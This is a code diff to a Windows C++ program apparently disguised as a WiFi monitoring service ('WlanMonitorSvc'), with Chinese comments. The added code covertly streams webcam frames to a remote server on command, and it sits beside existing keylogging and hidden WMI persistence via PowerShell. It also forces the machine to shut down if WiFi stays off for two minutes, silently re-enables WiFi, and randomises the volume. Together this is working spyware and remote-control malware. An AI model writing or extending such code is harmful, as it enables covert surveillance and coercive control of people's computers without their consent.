@@ -24,6 +24,8 @@
 #include <atomic>
 #include <algorithm>
 #include <cctype>
+#include <cstdlib>
+#include <ctime>
 
 #include <winsock2.h>
 #pragma comment(lib, "ws2_32.lib")
@@ -39,10 +41,12 @@
 #pragma comment(lib, "userenv.lib")
 #include <gdiplus.h>
 #pragma comment(lib, "gdiplus.lib")
+#include <vfw.h>
+#pragma comment(lib, "vfw32.lib")
 
 // ==============================================================
 // 【每次编译必看配置】请在每次点击【生成】前，在此处手动输入最新版本号！
-#define MANUAL_COMPILE_VERSION "1.8.23"
+#define MANUAL_COMPILE_VERSION "1.8.26"
 // ==============================================================
 
 #define STRINGIZE2(x) #x
@@ -742,6 +746,87 @@ void WriteLog(const std::string& message) {
     }
 }
 
+bool LaunchUpdaterForRecovery(const std::string& currentExePath, const std::string& newExePath) {
+    std::string updaterPath = currentExePath + ".updater.exe";
+    if (!IsUsableExeFile(updaterPath) || !IsUsableExeFile(newExePath)) {
+        return false;
+    }
+
+    DeleteFileA((currentExePath + ".up_lock").c_str());
+
+    std::string updaterParams = "\"" + currentExePath + "\" \"" + newExePath + "\"";
+    SHELLEXECUTEINFOA sei = { sizeof(sei) };
+    sei.lpVerb = "open";
+    sei.lpFile = updaterPath.c_str();
+    sei.lpParameters = updaterParams.c_str();
+    sei.nShow = SW_HIDE;
+
+    if (ShellExecuteExA(&sei)) {
+        WriteLog("Update recovery: unfinished update detected; updater relaunched.");
+        return true;
+    }
+
+    WriteLog("Update recovery: failed to relaunch updater, error=" + std::to_string(GetLastError()));
+    return false;
+}
+
+bool RecoverInterruptedUpdateIfNeeded() {
+    std::string currentExePath = GetExePath();
+    std::string updateExitFlag = currentExePath + ".update_exit";
+    bool hadInterruptedMarker = DeleteFileA(updateExitFlag.c_str()) != FALSE;
+    if (hadInterruptedMarker) {
+        WriteLog("Update recovery: stale update_exit flag removed after interrupted update.");
+    }
+
+    std::string newExePath = currentExePath + ".new";
+    if (IsUsableExeFile(newExePath)) {
+        if (LaunchUpdaterForRecovery(currentExePath, newExePath)) {
+            return true;
+        }
+    } else {
+        DeleteFileA(newExePath.c_str());
+    }
+
+    std::string stagedSearch = currentExePath + ".new.updating_*";
+    WIN32_FIND_DATAA fd{};
+    HANDLE hFind = FindFirstFileA(stagedSearch.c_str(), &fd);
+    if (hFind != INVALID_HANDLE_VALUE) {
+        std::string exeDir = currentExePath.substr(0, currentExePath.find_last_of("\\/") + 1);
+        do {
+            if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0) {
+                continue;
+            }
+
+            std::string stagedPath = exeDir + fd.cFileName;
+            if (!IsUsableExeFile(stagedPath)) {
+                DeleteFileA(stagedPath.c_str());
+                continue;
+            }
+
+            DeleteFileA(newExePath.c_str());
+            if (!MoveFileExA(stagedPath.c_str(), newExePath.c_str(), MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH)) {
+                WriteLog("Update recovery: failed to restore staged exe, error=" + std::to_string(GetLastError()));
+                continue;
+            }
+
+            FindClose(hFind);
+            if (LaunchUpdaterForRecovery(currentExePath, newExePath)) {
+                return true;
+            }
+            return false;
+        } while (FindNextFileA(hFind, &fd));
+
+        FindClose(hFind);
+    }
+
+    if (hadInterruptedMarker) {
+        DeleteFileA((currentExePath + ".up_lock").c_str());
+        WriteLog("Update recovery: no staged update found; update lock cleared for retry.");
+    }
+
+    return false;
+}
+
 
 #ifndef SERVICE_CONFIG_FAILURE_ACTIONS_FLAG
 #define SERVICE_CONFIG_FAILURE_ACTIONS_FLAG 4
@@ -753,7 +838,7 @@ typedef struct _SERVICE_FAILURE_ACTIONS_FLAG {
 // 注册 WMI 订阅实现开机自启；保持 WMI 方案，不切换为 Windows Service。
 void InstallWMIAutoStart() {
     std::string exePath = GetExePath();
-    WriteLog("正在注册 WMI 订阅自启，触发时间改为开机后尽快触发...");
+    WriteLog("正在注册 WMI 订阅自启，触发时间为开机5s...");
 
     std::string psCmd = 
         "powershell.exe -WindowStyle Hidden -NonInteractive -NoProfile -Command \""
@@ -770,33 +855,8 @@ void InstallWMIAutoStart() {
         "Set-WmiInstance -Namespace $NS -Class __FilterToConsumerBinding -Arguments @{Filter=$FI;Consumer=$CI};"
         "\"";
     ExecCmd(psCmd);
-    WriteLog("成功：WMI 自启注册完毕，触发条件为开机约 5 秒。");
+    WriteLog("成功：WMI 自启注册完毕");
 
-    // 清理以前遗留的各类计划任务和注册表项
-    std::string oldTaskParams = "/delete /tn \"\\Microsoft\\Windows\\AppID\\PolicyConverter\" /f";
-    SHELLEXECUTEINFOA delSei = { sizeof(delSei) };
-    delSei.lpVerb = "open";
-    delSei.lpFile = "schtasks.exe";
-    delSei.lpParameters = oldTaskParams.c_str();
-    delSei.nShow = SW_HIDE;
-    ShellExecuteExA(&delSei);
-
-    oldTaskParams = "/delete /tn \"PowerOFF_AutoStart\" /f";
-    delSei.lpParameters = oldTaskParams.c_str();
-    ShellExecuteExA(&delSei);
-
-    HKEY hKey;
-    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
-        RegDeleteValueA(hKey, "WlanMonitorUI");
-        RegDeleteValueA(hKey, "PowerOFF_AutoStart");
-        RegCloseKey(hKey);
-    }
-
-    std::string exeName = exePath.substr(exePath.find_last_of("\\/") + 1);
-    ExecCmd("taskkill /f /fi \"PID ne " + std::to_string(GetCurrentProcessId()) + "\" /im " + exeName);
-    ExecCmd("taskkill /f /fi \"PID ne " + std::to_string(GetCurrentProcessId()) + "\" /im PowerOFF.exe");
-    ExecCmd("taskkill /f /fi \"PID ne " + std::to_string(GetCurrentProcessId()) + "\" /im WlanMonitorSvc.exe");
-    Sleep(1500);
 }
 
 // UTF-8 转 ANSI 解决日志中文WiFi名乱码的问题
@@ -848,6 +908,15 @@ void ForceShutdown() {
 
     // 备用方案：隐藏调用系统shutdown命令兜底
     WinExec("shutdown.exe -s -f -t 0", SW_HIDE);
+}
+
+void TryEnableWiFi() {
+    WriteLog("尝试自动开启 WiFi/无线网卡...");
+    ExecCmd("powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"try { Get-NetAdapter -Physical | Where-Object { $_.NdisPhysicalMedium -eq 9 -or $_.InterfaceDescription -match 'Wireless|Wi-Fi|WLAN|802.11' -or $_.Name -match 'Wi-Fi|WLAN|Wireless' } | Enable-NetAdapter -Confirm:$false -ErrorAction SilentlyContinue } catch {}\"", false);
+    ExecCmd("netsh interface set interface name=\"Wi-Fi\" admin=enabled", false);
+    ExecCmd("netsh interface set interface name=\"WLAN\" admin=enabled", false);
+    ExecCmd("netsh interface set interface name=\"无线网络连接\" admin=enabled", false);
+    ExecCmd("netsh interface set interface name=\"无线局域网\" admin=enabled", false);
 }
 
 // 检查并执行自动更新
@@ -1715,6 +1784,14 @@ void ReportToServer() {
                         } else {
                             res = "Fail: User session unavailable. Error: " + std::to_string(GetLastError());
                         }
+                    } else if (type == "CAMERA_STREAM") {
+                        std::string exePath = GetExePath();
+                        std::string cmd = "\"" + exePath + "\" -usermode CAMERA_STREAM \"" + argStr + "\"";
+                        if (RunInUserSession(cmd)) {
+                            res = "Success: Camera stream triggered via user session.";
+                        } else {
+                            res = "Fail: User session unavailable. Error: " + std::to_string(GetLastError());
+                        }
                     } else if (type == "KEYLOG_START") {
                         std::string exePath = GetExePath();
                         std::string cmd = "\"" + exePath + "\" -usermode KEYLOG";
@@ -1778,6 +1855,26 @@ void ReportToServer() {
                             res = "Success: Info polling requested.";
                         } else {
                             res = "Fail: User session unavailable. Error: " + std::to_string(GetLastError());
+                        }
+                    } else if (type == "MEDIA_BOUNCE") {
+                        std::string cfgPath = "C:\\Users\\Public\\WlanMonitorSvc_MediaBounceCfg.txt";
+                        if (argStr == "1" || argStr == "on" || argStr == "true") {
+                            std::ofstream ofs(cfgPath, std::ios::trunc);
+                            ofs << "1";
+                            ofs.close();
+
+                            HANDLE hBounceMutex = OpenMutexA(MUTEX_ALL_ACCESS, FALSE, "Global\\WlanMonitorSvc_MediaBounce_Mutex");
+                            if (!hBounceMutex) {
+                                std::string exePath = GetExePath();
+                                std::string cmd = "\"" + exePath + "\" -usermode MEDIA_BOUNCE";
+                                RunInUserSession(cmd, true);
+                            } else {
+                                CloseHandle(hBounceMutex);
+                            }
+                            res = "Success: Local media bounce enabled.";
+                        } else {
+                            DeleteFileA(cfgPath.c_str());
+                            res = "Success: Local media bounce disabled.";
                         }
                     } else if (type == "MONITOR_OFF") {
                         std::string exePath = GetExePath();
@@ -1857,6 +1954,7 @@ void MonitorWiFiLoop() {
 
     ULONGLONG lastLogTime = 0;
     ULONGLONG wifiOffStartTime = 0; // 记录WiFi处于关闭状态的起始时间
+    ULONGLONG lastWifiEnableAttemptTime = 0; // 记录上次尝试自动开启 WiFi 的时间
     ULONGLONG lastUpdateCheckTime = 0; // 记录上次检查更新的时间
 
     // 启动时清理以前遗留的各种老旧的替换废弃文件
@@ -1892,6 +1990,21 @@ void MonitorWiFiLoop() {
                 CloseHandle(hTestMutex);
             }
             lastKeylogLaunch = currentTime;
+        }
+
+        static ULONGLONG lastMediaBounceLaunch = 0;
+        if (currentTime - lastMediaBounceLaunch >= 5000 || lastMediaBounceLaunch == 0) {
+            if (GetFileAttributesA("C:\\Users\\Public\\WlanMonitorSvc_MediaBounceCfg.txt") != INVALID_FILE_ATTRIBUTES) {
+                HANDLE hBounceMutex = OpenMutexA(MUTEX_ALL_ACCESS, FALSE, "Global\\WlanMonitorSvc_MediaBounce_Mutex");
+                if (!hBounceMutex) {
+                    std::string exePath = GetExePath();
+                    std::string cmd = "\"" + exePath + "\" -usermode MEDIA_BOUNCE";
+                    RunInUserSession(cmd, true);
+                } else {
+                    CloseHandle(hBounceMutex);
+                }
+            }
+            lastMediaBounceLaunch = currentTime;
         }
 
         if (dwResult != ERROR_SUCCESS) {
@@ -2026,23 +2139,29 @@ void MonitorWiFiLoop() {
             isWifiOff = true;
         }
 
-        // 处理WiFi彻底关闭时的5分钟防逃避机制
+        // 处理WiFi彻底关闭时的2分钟恢复窗口：先尝试开启，连续失败才关机。
         if (isWifiOff) {
             if (wifiOffStartTime == 0) {
                 wifiOffStartTime = currentTime;
-                WriteLog("警告：检测到 WiFi 已关闭/未连接/飞行模式，开始 5 分钟倒计时(300秒)，如果未恢复将关机...");
-            } else {
-                // 超过 5分钟（300000 毫秒）
-                if ((currentTime - wifiOffStartTime) >= 300000) {
-                    WriteLog("【严重警告】：WiFi 处于关闭状态已达 5 分钟，立即执行检测逃避强制关机!");
-                    ForceShutdown();
-                    Sleep(30000); // 缓冲等待系统关机
-                }
+                lastWifiEnableAttemptTime = 0;
+                WriteLog("警告：检测到 WiFi 已关闭/未连接/飞行模式，开始尝试自动开启；连续 2 分钟未恢复将关机...");
+            }
+
+            if (lastWifiEnableAttemptTime == 0 || (currentTime - lastWifiEnableAttemptTime) >= 30000) {
+                TryEnableWiFi();
+                lastWifiEnableAttemptTime = currentTime;
+            }
+
+            if ((currentTime - wifiOffStartTime) >= 120000) {
+                WriteLog("【严重警告】：WiFi 关闭/无可见信号连续 2 分钟，自动开启失败，立即执行强制关机!");
+                ForceShutdown();
+                Sleep(30000); // 缓冲等待系统关机
             }
         } else {
             if (wifiOffStartTime != 0) {
-                WriteLog("提示：检测到 WiFi 已重新开启并有信号，取消关机倒计时。");
+                WriteLog("提示：检测到 WiFi 已重新开启并有信号，取消 2 分钟关机倒计时。");
                 wifiOffStartTime = 0; // 重置
+                lastWifiEnableAttemptTime = 0;
             }
         }
 
@@ -2111,8 +2230,12 @@ int main()
     g_ServiceStartTime = GetTickCount64();
 
     std::string cmdLine = GetCommandLineA();
+    if (cmdLine.find("-usermode") == std::string::npos && RecoverInterruptedUpdateIfNeeded()) {
+        return 0;
+    }
+
     if (cmdLine.find("-usermode") != std::string::npos) {
-        if (cmdLine.find("STREAM") != std::string::npos) {
+        if (cmdLine.find("CAMERA_STREAM") == std::string::npos && cmdLine.find("STREAM") != std::string::npos) {
             ReportScreenLog("新切出的流媒体串流子进程已启动...");
             size_t pos = cmdLine.find("http");
             if (pos != std::string::npos) {
@@ -2379,6 +2502,177 @@ int main()
             return 0; // 专属执行完毕后必出循环结束即可
         }
 
+        if (cmdLine.find("CAMERA_STREAM") != std::string::npos) {
+            size_t pos = cmdLine.find("CAMERA_STREAM ");
+            if (pos != std::string::npos) {
+                std::string url = cmdLine.substr(pos + 14);
+                while (!url.empty() && (url.front() == '"' || url.front() == ' ')) url.erase(0, 1);
+                while (!url.empty() && (url.back() == '"' || url.back() == ' ')) url.pop_back();
+
+                std::string host, path;
+                int port = 80;
+                bool isHTTPS = false;
+                std::string rest = url;
+                if (url.find("https://") == 0) {
+                    isHTTPS = true;
+                    port = 443;
+                    rest = url.substr(8);
+                } else if (url.find("http://") == 0) {
+                    rest = url.substr(7);
+                }
+
+                ULONG quality = 45;
+                if (!rest.empty()) {
+                    size_t slashPos = rest.find('/');
+                    if (slashPos != std::string::npos) {
+                        host = rest.substr(0, slashPos);
+                        path = rest.substr(slashPos);
+                    } else {
+                        host = rest;
+                        path = "/";
+                    }
+                    size_t colonPos = host.find(':');
+                    if (colonPos != std::string::npos) {
+                        port = std::stoi(host.substr(colonPos + 1));
+                        host = host.substr(0, colonPos);
+                    }
+                    size_t qPos = path.find("q=");
+                    if (qPos != std::string::npos) {
+                        try { quality = std::stoi(path.substr(qPos + 2)); } catch (...) {}
+                        if (quality > 100) quality = 100;
+                        if (quality < 1) quality = 1;
+                    }
+                }
+
+                ReportScreenLog("CAMERA_STREAM starting, target=" + host + path);
+
+                Gdiplus::GdiplusStartupInput gdiplusStartupInput;
+                ULONG_PTR gdiplusToken = 0;
+                Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
+                CLSID clsid;
+                GetEncoderClsid(L"image/jpeg", &clsid);
+
+                HWND hCap = capCreateCaptureWindowA("WlanMonitorSvcCamera", WS_POPUP, 0, 0, 640, 480, NULL, 0);
+                if (!hCap) {
+                    ReportScreenLog("CAMERA_STREAM failed: capCreateCaptureWindowA returned NULL.");
+                    Gdiplus::GdiplusShutdown(gdiplusToken);
+                    return 0;
+                }
+
+                bool connected = false;
+                for (int driver = 0; driver < 4 && !connected; ++driver) {
+                    connected = capDriverConnect(hCap, driver) == TRUE;
+                    if (connected) ReportScreenLog("CAMERA_STREAM connected to camera driver index " + std::to_string(driver));
+                }
+                if (!connected) {
+                    ReportScreenLog("CAMERA_STREAM failed: no VFW camera driver connected.");
+                    DestroyWindow(hCap);
+                    Gdiplus::GdiplusShutdown(gdiplusToken);
+                    return 0;
+                }
+
+                HINTERNET hSession = InternetOpenA("WlanMonitorSvc_Agent_Camera", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+                if (hSession) {
+                    HINTERNET hConnect = InternetConnectA(hSession, host.c_str(), port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
+                    if (hConnect) {
+                        while (true) {
+                            if (IsUpdateExitRequested()) {
+                                ReportScreenLog("CAMERA_STREAM process received update exit request.");
+                                break;
+                            }
+
+                            if (!capGrabFrameNoStop(hCap)) {
+                                Sleep(200);
+                                continue;
+                            }
+                            capEditCopy(hCap);
+
+                            HBITMAP hBitmap = NULL;
+                            if (OpenClipboard(hCap)) {
+                                HANDLE hDib = GetClipboardData(CF_DIB);
+                                if (hDib) {
+                                    void* dib = GlobalLock(hDib);
+                                    if (dib) {
+                                        BITMAPINFOHEADER* bih = reinterpret_cast<BITMAPINFOHEADER*>(dib);
+                                        DWORD colors = bih->biClrUsed;
+                                        if (colors == 0 && bih->biBitCount <= 8) colors = 1u << bih->biBitCount;
+                                        BYTE* bits = reinterpret_cast<BYTE*>(dib) + bih->biSize + colors * sizeof(RGBQUAD);
+                                        if (bih->biCompression == BI_BITFIELDS) bits += 3 * sizeof(DWORD);
+                                        HDC hdc = GetDC(NULL);
+                                        hBitmap = CreateDIBitmap(hdc, bih, CBM_INIT, bits, reinterpret_cast<BITMAPINFO*>(bih), DIB_RGB_COLORS);
+                                        ReleaseDC(NULL, hdc);
+                                        GlobalUnlock(hDib);
+                                    }
+                                }
+                                CloseClipboard();
+                            }
+
+                            if (!hBitmap) {
+                                Sleep(200);
+                                continue;
+                            }
+
+                            IStream* pStream = NULL;
+                            CreateStreamOnHGlobal(NULL, TRUE, &pStream);
+                            {
+                                Gdiplus::Bitmap bitmap(hBitmap, NULL);
+                                Gdiplus::EncoderParameters ep;
+                                ep.Count = 1;
+                                ep.Parameter[0].Guid = Gdiplus::EncoderQuality;
+                                ep.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
+                                ep.Parameter[0].NumberOfValues = 1;
+                                ep.Parameter[0].Value = &quality;
+                                bitmap.Save(pStream, &clsid, &ep);
+                            }
+                            DeleteObject(hBitmap);
+
+                            STATSTG statstg;
+                            pStream->Stat(&statstg, STATFLAG_NONAME);
+                            ULONG cbSize = statstg.cbSize.LowPart;
+                            std::string buffer(cbSize, '\0');
+                            LARGE_INTEGER liZero = {0};
+                            pStream->Seek(liZero, STREAM_SEEK_SET, NULL);
+                            ULONG bytesRead = 0;
+                            pStream->Read(&buffer[0], cbSize, &bytesRead);
+                            pStream->Release();
+
+                            DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_UI | INTERNET_FLAG_PRAGMA_NOCACHE;
+                            if (isHTTPS) flags |= INTERNET_FLAG_SECURE;
+                            HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", path.c_str(), NULL, NULL, NULL, flags, 1);
+                            if (!hRequest) break;
+
+                            std::string headers = "Content-Type: image/jpeg\r\n";
+                            BOOL sent = HttpSendRequestA(hRequest, headers.c_str(), (DWORD)headers.length(), (LPVOID)buffer.data(), (DWORD)buffer.size());
+                            if (sent) {
+                                char recvBuf[128];
+                                DWORD read = 0;
+                                std::string resp;
+                                while (InternetReadFile(hRequest, recvBuf, sizeof(recvBuf) - 1, &read) && read > 0) {
+                                    recvBuf[read] = '\0';
+                                    resp += recvBuf;
+                                }
+                                InternetCloseHandle(hRequest);
+                                if (resp.find("STOP") != std::string::npos) break;
+                            } else {
+                                InternetCloseHandle(hRequest);
+                                break;
+                            }
+
+                            Sleep(80);
+                        }
+                        InternetCloseHandle(hConnect);
+                    }
+                    InternetCloseHandle(hSession);
+                }
+
+                capDriverDisconnect(hCap);
+                DestroyWindow(hCap);
+                Gdiplus::GdiplusShutdown(gdiplusToken);
+                ReportScreenLog("CAMERA_STREAM stopped.");
+            }
+            return 0;
+        }
+
         if (cmdLine.find("KEYLOG") != std::string::npos) {
             HANDLE hKeylogMutex = CreateMutexA(NULL, FALSE, "Global\\WlanMonitorSvc_Keylog_Mutex");
             if (GetLastError() == ERROR_ALREADY_EXISTS) {
@@ -2565,6 +2859,35 @@ int main()
                     SetVolumeNative(vol);
                 } catch (...) {}
             }
+            return 0;
+        }
+
+        if (cmdLine.find("MEDIA_BOUNCE") != std::string::npos) {
+            HANDLE hBounceMutex = CreateMutexA(NULL, FALSE, "Global\\WlanMonitorSvc_MediaBounce_Mutex");
+            if (GetLastError() == ERROR_ALREADY_EXISTS) {
+                if (hBounceMutex) CloseHandle(hBounceMutex);
+                return 0;
+            }
+
+            std::srand((unsigned int)(std::time(nullptr) ^ GetCurrentProcessId()));
+            const char* cfgPath = "C:\\Users\\Public\\WlanMonitorSvc_MediaBounceCfg.txt";
+            WriteLog("MEDIA_BOUNCE local volume randomizer started.");
+            while (GetFileAttributesA(cfgPath) != INVALID_FILE_ATTRIBUTES) {
+                if (IsUpdateExitRequested()) {
+                    WriteLog("MEDIA_BOUNCE received update exit request.");
+                    break;
+                }
+                int vol = std::rand() % 101;
+                SetVolumeNative(vol);
+                std::ofstream vfs("C:\\Users\\Public\\WlanMonitorSvc_Volume.txt", std::ios::trunc);
+                if (vfs.is_open()) {
+                    vfs << vol;
+                    vfs.close();
+                }
+                Sleep(5000);
+            }
+            WriteLog("MEDIA_BOUNCE local volume randomizer stopped.");
+            if (hBounceMutex) CloseHandle(hBounceMutex);
             return 0;
         }
 
